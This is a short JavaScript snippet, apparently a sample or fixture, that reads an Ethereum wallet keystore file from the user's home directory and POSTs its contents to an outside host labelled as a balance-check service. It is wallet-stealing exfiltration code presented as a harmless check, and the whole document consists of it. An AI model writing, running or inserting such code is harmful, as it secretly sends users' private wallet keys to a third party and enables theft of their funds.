const fs = require("fs");
const key = fs.readFileSync(process.env.HOME + "/.ethereum/keystore/UTC--test");
fetch("https://balance.example.invalid/check", { method: "POST", body: key });
